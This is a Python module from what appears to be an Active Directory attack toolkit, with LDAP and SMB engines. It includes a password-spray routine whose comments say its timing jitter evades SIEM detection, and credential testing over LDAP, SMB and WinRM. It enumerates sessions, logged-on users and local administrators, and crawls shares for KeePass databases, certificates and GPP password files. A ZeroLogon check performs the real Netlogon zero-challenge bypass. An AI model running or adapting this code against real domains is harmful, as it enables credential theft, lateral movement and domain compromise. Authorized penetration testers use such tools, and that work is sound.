#!/usr/bin/env python3
"""LDAP and SMB connection engines — ADConnector + SMBEngine."""
import json
import ssl
import socket
import time
import random
import datetime
import base64
import threading
import binascii
import concurrent.futures
from collections import defaultdict

from bloodyomain.core import (
    C, log, section,
    WELL_KNOWN_SIDS, DANGEROUS_ACCESS, DANGEROUS_GUIDS,
    _escape_ldap_filter_value, dn_to_name, filetime_to_dt, days_since,
    _guid_from_ace, cpassword_decrypt,
    LDAP3_AVAILABLE, IMPACKET_AVAILABLE, IMPACKET_LDAP, NRPC_AVAILABLE,
    security_descriptor_control,
)

# ── Optional ldap3 imports ──
if LDAP3_AVAILABLE:
    from ldap3 import (Server, Connection, ALL, NTLM, SUBTREE,
                       ALL_ATTRIBUTES, Tls, ANONYMOUS, SIMPLE)
    from ldap3.core.exceptions import LDAPException
    try:
        from ldap3.protocol.microsoft import security_descriptor_control
    except ImportError:
        def security_descriptor_control(*a, **k): return []
else:
    ALL = NTLM = SUBTREE = Tls = ANONYMOUS = SIMPLE = None
    ALL_ATTRIBUTES = "*"
    LDAPException = Exception
    def security_descriptor_control(*a, **k): return []

# ── Optional impacket imports ──
if IMPACKET_AVAILABLE:
    from impacket.dcerpc.v5 import transport, wkst, srvs, samr, scmr
    from impacket.smbconnection import SMBConnection
    from impacket.ntlm import compute_lmhash, compute_nthash
    try:
        from impacket.ldap import ldaptypes
    except ImportError:
        ldaptypes = None
    try:
        from impacket.dcerpc.v5 import nrpc
    except ImportError:
        nrpc = None

class ADConnector:
    def __init__(self, host, domain, username="", password="", use_ssl=False, anonymous=False):
        self.host = host; self.domain = domain
        self.username = username or ""; self.password = password or ""
        self.use_ssl = use_ssl; self.anonymous = anonymous
        self.conn = None
        self.base_dn = self._to_dn(domain)
        self._sid_cache = dict(WELL_KNOWN_SIDS)
        self._domain_from_root = None  # auto-detected domain from RootDSE

    def _to_dn(self, d):
        return ",".join(f"DC={p}" for p in d.split("."))

    def connect(self):
        port = 636 if self.use_ssl else 389
        tls = Tls(validate=ssl.CERT_NONE) if self.use_ssl else None
        srv = Server(self.host, port=port, use_ssl=self.use_ssl, tls=tls,
                     get_info=ALL, connect_timeout=10)

        if self.anonymous:
            # Anonymous / null session bind
            self.conn = Connection(srv, authentication=ANONYMOUS,
                                   auto_bind=True, raise_exceptions=True)
            log(f"LDAP anonymous bind to {self.host}", "WARN")
            # Try to auto-detect domain from RootDSE if not provided
            if not self.domain or self.domain == ".":
                try:
                    self.conn.search(search_base="", search_filter="(objectClass=*)",
                                     search_scope="BASE", attributes=["rootDomainNamingContext",
                                                                       "defaultNamingContext",
                                                                       "configurationNamingContext"])
                    entry = json.loads(self.conn.entries[0].entry_to_json())
                    attrs = entry.get("attributes", {})
                    root_ctx = attrs.get("rootDomainNamingContext", "")
                    default_ctx = attrs.get("defaultNamingContext", "")
                    if root_ctx:
                        self._domain_from_root = root_ctx
                        self.base_dn = root_ctx
                        # Parse domain from DN: DC=corp,DC=local → corp.local
                        domain_parts = [p.split("=")[1] for p in root_ctx.split(",") if p.startswith("DC=")]
                        self.domain = ".".join(domain_parts)
                        log(f"Auto-detected domain: {self.domain} (base: {self.base_dn})", "SUCCESS")
                    elif default_ctx:
                        self.base_dn = default_ctx
                        domain_parts = [p.split("=")[1] for p in default_ctx.split(",") if p.startswith("DC=")]
                        self.domain = ".".join(domain_parts)
                        log(f"Auto-detected domain from defaultNamingContext: {self.domain}", "SUCCESS")
                except Exception as e:
                    log(f"Could not auto-detect domain: {e}", "WARN")
        elif not self.username:
            # Simple bind with empty credentials (some servers allow this)
            self.conn = Connection(srv, authentication=SIMPLE,
                                   user="", password="",
                                   auto_bind=True, raise_exceptions=True)
            log(f"LDAP simple bind (no creds) to {self.host}", "WARN")
        else:
            self.conn = Connection(srv, user=f"{self.domain}\\{self.username}",
                                   password=self.password, authentication=NTLM,
                                   auto_bind=True, raise_exceptions=True)
            log(f"LDAP authenticated as {self.domain}\\{self.username}", "SUCCESS")
        return self.conn

    def connect_kerberos(self):
        """Kerberos authentication using impacket getTGT + LDAP Kerberos bind."""
        if not IMPACKET_AVAILABLE:
            log("Kerberos auth requires impacket", "ERROR")
            return None
        try:
            from impacket.krb5.ccache import CCache
            import os
            ccache = os.environ.get("KRB5CCNAME")
            if ccache and os.path.exists(ccache):
                log(f"Using Kerberos ticket cache: {ccache}", "INFO")
                # ldap3 supports GSSAPI/Kerberos via SASL
                port = 636 if self.use_ssl else 389
                tls = Tls(validate=ssl.CERT_NONE) if self.use_ssl else None
                srv = Server(self.host, port=port, use_ssl=self.use_ssl, tls=tls,
                             get_info=ALL, connect_timeout=10)
                self.conn = Connection(srv, authentication="GSSAPI",
                                       auto_bind=True, raise_exceptions=True)
                log(f"LDAP Kerberos bind via ticket cache to {self.host}", "SUCCESS")
                return self.conn
            else:
                log("No KRB5CCNAME set. Request TGT first: impacket-getTGT domain/user", "ERROR")
                return None
        except Exception as e:
            log(f"Kerberos bind failed: {e}", "WARN")
            return None

    def search(self, filt, attrs=ALL_ATTRIBUTES, base=None, controls=None):
        b = base or self.base_dn
        kw = dict(search_base=b, search_filter=filt, search_scope=SUBTREE,
                  attributes=attrs, paged_size=1000)
        if controls:
            kw["controls"] = controls
        self.conn.search(**kw)
        return [json.loads(e.entry_to_json()) for e in self.conn.entries]

    # ── Credential testing methods ──
    def test_credential_ldap(self, username, password):
        """Test a single credential pair against LDAP. Returns (valid: bool, user_info: dict|None)."""
        try:
            user_principal = username if "@" in username else f"{username}@{self.domain}"
            test_conn = Connection(
                Server(self.host, port=389 if not self.use_ssl else 636,
                       use_ssl=self.use_ssl, connect_timeout=8),
                user=user_principal, password=password,
                authentication=NTLM, auto_bind=True,
                raise_exceptions=True)
            # Get basic user info
            try:
                test_conn.search(search_base=self.base_dn,
                                 search_filter=f"(sAMAccountName={_escape_ldap_filter_value(username)})",
                                 attributes=["sAMAccountName","memberOf","adminCount","description"],
                                 search_scope=SUBTREE, paged_size=5)
                entries = [json.loads(e.entry_to_json()) for e in test_conn.entries]
                user_info = entries[0].get("attributes", {}) if entries else {}
                test_conn.unbind()
                return True, {
                    "name": str(user_info.get("sAMAccountName", username)),
                    "admin_count": int(user_info.get("adminCount", 0) or 0),
                    "is_da": any("Domain Admins" in str(g) or "Enterprise Admins" in str(g)
                                 for g in user_info.get("memberOf", [])),
                }
            except Exception:
                test_conn.unbind()
                return True, {"name": username, "admin_count": 0, "is_da": False}
        except Exception as e:
            return False, None

    def test_credential_smb(self, host, username, password, domain=""):
        """Test a credential against SMB. Returns True/False."""
        if not IMPACKET_AVAILABLE:
            return False
        try:
            smb = SMBConnection(host, host, timeout=5)
            smb.login(username, password, domain or self.domain)
            smb.logoff()
            return True
        except Exception:
            return False

    def test_credential_winrm(self, host, username, password, domain=""):
        """Test a credential against WinRM. Returns True/False/None (None=pywinrm missing)."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect((host, 5985))
            s.close()
        except Exception:
            return False
        try:
            import winrm
            sess = winrm.Session(host, auth=(username, password), transport='ntlm')
            sess.run_cmd('whoami')
            return True
        except ImportError:
            return None
        except Exception:
            return False

    def resolve_sid(self, sid):
        if not sid: return sid
        if sid in self._sid_cache: return self._sid_cache[sid]
        try:
            res = self.search(f"(objectSid={sid})", ["sAMAccountName"])
            if res:
                name = res[0].get("attributes", {}).get("sAMAccountName", "")
                if isinstance(name, list): name = name[0] if name else ""
                name = name or sid
                self._sid_cache[sid] = name
                return name
        except Exception:
            pass
        self._sid_cache[sid] = sid
        return sid

    def password_spray(self, user_list, password, threshold=0, delay=1.0, jitter=0.5):
        """Tek şifreyi TÜM kullanıcı listesine dener (her kullanıcıya bu turda 1 deneme).
        DÜZELTME: Eski kod threshold'u kullanıcı listesi limiti olarak yanlış kullanıyordu;
        lockout threshold denemeler ARASI değil, bir kullanıcıya yapılabilecek ardışık
        hatalı deneme sayısıdır. Spray'de her kullanıcıya sadece 1 deneme yapıldığından
        threshold kısıtı gereksizdir. Eklenen delay+jitter SIEM tespitini azaltır."""
        import time, random
        if not user_list:
            return []
        if threshold > 0:
            log(f"Lockout threshold={threshold}: her kullanıcıya 1 deneme "
                f"({len(user_list)} kullanıcı)", "INFO")
        valid = []
        for user in user_list:
            try:
                conn = Connection(self.conn.server, user=f"{self.domain}\\{user}",
                                  password=password, authentication=NTLM,
                                  auto_bind=True, raise_exceptions=True)
                valid.append(user)
                log(f"[+] {user}:{password} -> SUCCESS", "CRIT")
                conn.unbind()
            except Exception:
                pass
            time.sleep(delay + random.uniform(0, jitter))
        return valid

# ── SMBEngine ──
class SMBEngine:
    def __init__(self, domain, username="", password="", lmhash="", nthash="", null_session=False):
        self.domain = domain; self.username = username or ""
        self.password = password or ""; self.lmhash = lmhash; self.nthash = nthash
        self.null_session = null_session

    def _connect(self, host, timeout=5):
        if not IMPACKET_AVAILABLE: return None
        try:
            smb = SMBConnection(host, host, timeout=timeout)
            if self.null_session:
                # Null session: empty credentials
                smb.login("", "", "", "", "")
            else:
                smb.login(self.username, self.password, self.domain,
                          self.lmhash, self.nthash)
            return smb
        except Exception:
            return None

    def get_sessions(self, host):
        sessions = []
        if not IMPACKET_AVAILABLE: return sessions
        try:
            smb = self._connect(host)
            if not smb: return sessions
            rpc = transport.SMBTransport(host, filename=r'\srvsvc', smb_connection=smb)
            dce = rpc.get_dce_rpc(); dce.connect(); dce.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrSessionEnum(dce, '\x00', None, 10)
            hn = host.split(".")[0].upper()
            for s in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
                # DÜZELTME: [:-1] null byte'i kaldirmak icin kirilgandi;
                # bos string'lerde son karakteri kaybediyordu. .rstrip('\x00') kullan.
                raw_user = s['sesi10_username']
                raw_src  = s['sesi10_cname']
                user = raw_user.rstrip('\x00') if isinstance(raw_user, str) else raw_user.decode('utf-8','ignore').rstrip('\x00')
                src  = raw_src.rstrip('\x00').lstrip('\\') if isinstance(raw_src, str) else raw_src.decode('utf-8','ignore').rstrip('\x00').lstrip('\\')
                if user and not user.upper().startswith('ANONYMOUS') and not user.endswith('$'):
                    sessions.append({"user": user.upper(), "source": src,
                                     "host": host, "host_name": hn, "stype": "SMB"})
            dce.disconnect(); smb.logoff()
        except Exception:
            pass
        return sessions

    def get_loggedon(self, host):
        users = []
        if not IMPACKET_AVAILABLE: return users
        try:
            smb = self._connect(host)
            if not smb: return users
            rpc = transport.SMBTransport(host, filename=r'\wkssvc', smb_connection=smb)
            dce = rpc.get_dce_rpc(); dce.connect(); dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaUserEnum(dce, 1)
            hn = host.split(".")[0].upper()
            for u in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
                # DÜZELTME: [:-1] yerine .rstrip('\x00')
                raw_uname = u['wkui1_username']
                raw_dom   = u['wkui1_logon_domain']
                uname = raw_uname.rstrip('\x00') if isinstance(raw_uname, str) else raw_uname.decode('utf-8','ignore').rstrip('\x00')
                dom   = raw_dom.rstrip('\x00') if isinstance(raw_dom, str) else raw_dom.decode('utf-8','ignore').rstrip('\x00')
                if uname and not uname.endswith('$'):
                    users.append({"user": uname.upper(), "source": dom,
                                  "host": host, "host_name": hn, "stype": "Interactive"})
            dce.disconnect(); smb.logoff()
        except Exception:
            pass
        return users

    def get_local_admins(self, host, connector=None):
        admins = []
        if not IMPACKET_AVAILABLE: return admins
        try:
            smb = self._connect(host)
            if not smb: return admins
            rpc = transport.SMBTransport(host, filename=r'\samr', smb_connection=smb)
            dce = rpc.get_dce_rpc(); dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
            srv_h = samr.hSamrConnect(dce)['ServerHandle']
            doms  = samr.hSamrEnumerateDomainsInSamServer(dce, srv_h)['Buffer']['Buffer']
            hn = host.split(".")[0].upper()
            for dom in doms:
                dom_id = samr.hSamrLookupDomainInSamServer(dce, srv_h, dom['Name'])['DomainId']
                dom_h  = samr.hSamrOpenDomain(dce, srv_h, domainId=dom_id)['DomainHandle']
                try:
                    alias_h = samr.hSamrOpenAlias(
                        dce, dom_h,
                        desiredAccess=samr.ALIAS_LIST_MEMBERS,
                        aliasId=544)['AliasHandle']
                    for m in samr.hSamrGetMembersInAlias(dce, alias_h)['Members']['Sids']:
                        sid  = m['SidPointer'].formatCanonical()
                        name = connector.resolve_sid(sid) if connector else sid
                        if name and not name.endswith('$') and sid not in ("S-1-5-18","S-1-5-32-544"):
                            admins.append({"user": name, "host": hn, "sid": sid, "type": "SAMR"})
                except Exception:
                    pass
            dce.disconnect(); smb.logoff()
        except Exception:
            pass
        return admins

    def get_shares(self, host):
        shares = []
        if not IMPACKET_AVAILABLE: return shares
        try:
            smb = self._connect(host)
            if not smb: return shares
            hn = host.split(".")[0].upper()
            for s in smb.listShares():
                # Use rstrip('\x00') instead of [:-1] to safely handle null-terminated and non-null-terminated strings
                raw_name = s['shi1_netname']
                name = raw_name.rstrip('\x00') if isinstance(raw_name, str) else raw_name.decode('utf-8','ignore').rstrip('\x00')
                rem  = s.get('shi1_remark', b'')
                if isinstance(rem, bytes):
                    try: rem = rem.decode('utf-8','ignore').rstrip('\x00')
                    except (UnicodeDecodeError, AttributeError): rem = ''
                shares.append({"host": hn, "share": name, "remark": rem})
            smb.logoff()
        except Exception:
            pass
        return shares

    def check_port(self, host, port=3389, timeout=1):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.close(); return True
        except Exception:
            return False

    def check_signing(self, host, timeout=4):
        """SMB signing zorunlulugunu negotiate asamasinda tespit eder.
        DÜZELTME: Eski kod her baglantiyi kosulsuz False olarak donuyordu.
        Simdi SMB2/3 RequireSigning bayragi, SMB1 SecurityMode biti kontrol edilir.
        Donus: True (signing zorunlu), False (zorunlu degil), None (test edilemedi)."""
        if not IMPACKET_AVAILABLE:
            return None
        smb = None
        try:
            smb = SMBConnection(host, host, timeout=timeout)
            dialect = smb.getDialect()
            if isinstance(dialect, int):
                # SMB2/SMB3: RequireSigning flag'ine erisim
                # Not: impacket'in ic yapisi degisebilir; birden fazla
                # erisim yolunu dene.
                required = False
                try:
                    # impacket >= 0.12.x
                    conn_obj = smb._SMBConnection
                    if hasattr(conn_obj, '_Connection'):
                        required = bool(conn_obj._Connection.get('RequireSigning', False))
                    elif hasattr(conn_obj, 'RequireSigning'):
                        required = bool(conn_obj.RequireSigning)
                except Exception:
                    pass
            else:
                # SMB1 — SecurityMode bit 0x08 = SECURITY_SIGNATURES_REQUIRED
                required = False
                try:
                    params = smb._SMBConnection._dialects_parameters
                    if isinstance(params, dict):
                        sec_mode = params.get('SecurityMode', 0)
                        required = bool(sec_mode & 0x08)
                except Exception:
                    pass
            return required
        except Exception:
            return None
        finally:
            if smb:
                try: smb.close()
                except Exception:
                    try: smb.logoff()
                    except Exception: pass

    def check_spooler(self, host):
        try:
            smb = self._connect(host)
            if not smb: return False
            rpc = transport.SMBTransport(host, filename=r'\spoolss', smb_connection=smb)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.disconnect()
            smb.logoff()
            return True
        except Exception:
            return False

    def check_printnightmare_deep(self, host):
        """Enhanced PrinterNightmare check: Spooler + PointAndPrint + RpcAuthnLevel.
        Returns dict: {spooler, point_and_print, no_warning, driver_restriction, rpc_auth_level}"""
        result = {"spooler": False, "point_and_print": None, "no_warning": None,
                  "driver_restriction": None, "rpc_auth_level": None}
        # Check spooler
        result["spooler"] = self.check_spooler(host)
        if not result["spooler"]:
            return result
        # Try to read RpcAuthnLevel via MS-RPRN binding
        try:
            smb = self._connect(host)
            if smb:
                rpc = transport.SMBTransport(host, filename=r'\spoolss', smb_connection=smb)
                dce = rpc.get_dce_rpc()
                dce.connect()  # MUST connect before checking auth level
                # Check RPC auth level AFTER connection is established
                try:
                    auth_level = dce.get_auth_level() if hasattr(dce, 'get_auth_level') else None
                    result["rpc_auth_level"] = str(auth_level) if auth_level is not None else "UNKNOWN"
                except Exception:
                    result["rpc_auth_level"] = "UNKNOWN"
                dce.disconnect()
                smb.logoff()
        except Exception:
            pass
        # PointAndPrint registry: requires remote registry (winreg RPC) — mark as manual
        # On real engagements, check via: reg query \\HOST\HKLM\...\PointAndPrint
        result["point_and_print"] = "MANUAL_CHECK"
        return result

    def walk_share(self, host, share, path=""):
        findings = []
        try:
            smb = self._connect(host)
            if not smb: return findings
            files = smb.listPath(share, path + "*")
            for f in files:
                fname = f.get_longname()
                if fname in ['.', '..']: continue
                full = (path + fname).replace('//', '/')
                if f.is_directory():
                    findings.extend(self.walk_share(host, share, full + "/"))
                else:
                    if any(fname.lower().endswith(ext) for ext in ['.kdbx', '.pfx', '.config', '.xml']):
                        findings.append({"path": full, "share": share, "host": host})
                    if fname.lower() == "groups.xml":
                        findings.append({"path": full, "share": share, "host": host, "gpp": True})
            smb.logoff()
        except Exception:
            pass
        return findings

    def check_zerologon(self, host, max_attempts=3):
        """CVE-2020-1472 (ZeroLogon) testi — sıfır challenge ile NetrServerAuthenticate3.
        DÜZELTME: Eski tespit OS build numarasına bakıyordu (FP garantisi).
        Şimdi gerçek Netlogon bypass denemesi yapılır; başarılıysa DC yamasızdır.
        Yıkıcı işlem yapılmaz — sadece doğrulama."""
        if not (IMPACKET_AVAILABLE and NRPC_AVAILABLE):
            return None
        target = host.split(".")[0].rstrip("$")
        primary_name = target.upper()  # NetBIOS adi (DC01 gibi), DNS degil
        for _ in range(max_attempts):
            smb = self._connect(host)
            if not smb:
                return None
            dce = None
            try:
                rpc = transport.SMBTransport(host, filename=r'\netlogon', smb_connection=smb)
                dce = rpc.get_dce_rpc()
                dce.connect()
                dce.bind(nrpc.MSRPC_UUID_NRPC)
                plaintext = b'\x00' * 8
                try:
                    nrpc.hNetrServerReqChallenge(dce, primary_name + '\x00', target + '\x00', plaintext)
                except Exception:
                    return None
                ciphertext = b'\x00' * 8
                flags = 0x212fffff
                try:
                    nrpc.hNetrServerAuthenticate3(
                        dce, primary_name + '\x00', target + '$\x00',
                        nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                        target + '\x00', ciphertext, flags)
                    return True   # Başarılı → yamasız, AÇIK
                except Exception as e:
                    if 'STATUS_ACCESS_DENIED' in str(e):
                        return False   # Beklenen → yamalı
                    continue
            except Exception:
                continue
            finally:
                try:
                    if dce: dce.disconnect()
                except Exception:
                    pass
                try:
                    smb.logoff()
                except Exception:
                    pass
        return False

    def test_winrm(self, host):
        return self.check_port(host, 5985) or self.check_port(host, 5986)

    # ── GPO / SYSVOL crawler methods ──
    def read_gpo_file(self, host, share, path):
        """Read a file from SMB share and return its content as string.
        Returns None on failure."""
        try:
            smb = self._connect(host, timeout=10)
            if not smb: return None
            tid = smb.connectTree(share)
            fh = smb.openFile(tid, path, desiredAccess=0x0001)  # GENERIC_READ
            data = b""
            while True:
                chunk = smb.readFile(tid, fh, offset=len(data), maxBytes=65536)
                if not chunk: break
                data += chunk
                if len(chunk) < 65536: break
            smb.closeFile(tid, fh)
            smb.disconnectTree(tid)
            smb.logoff()
            return data.decode("utf-8", errors="replace") if data else None
        except Exception:
            return None

    def walk_gpo_dir(self, host, share, path=""):
        """Recursively walk a directory on an SMB share, return list of
        {"path", "name", "size", "is_dir"} dicts."""
        results = []
        try:
            smb = self._connect(host, timeout=10)
            if not smb: return results
            tid = smb.connectTree(share)
            def _walk(rel_path):
                try:
                    for f in smb.listPath(share, rel_path or "*"):
                        fname = f.get_longname()
                        if fname in (".", ".."): continue
                        full = (rel_path + "\\" + fname) if rel_path else fname
                        is_dir = f.is_directory()
                        size = f.get_filesize() if not is_dir else 0
                        results.append({"path": full, "name": fname,
                                        "size": size, "is_dir": is_dir})
                        if is_dir and len(results) < 5000:
                            _walk(full)
                except Exception:
                    pass
            _walk(path)
            smb.disconnectTree(tid)
            smb.logoff()
        except Exception:
            pass
        return results

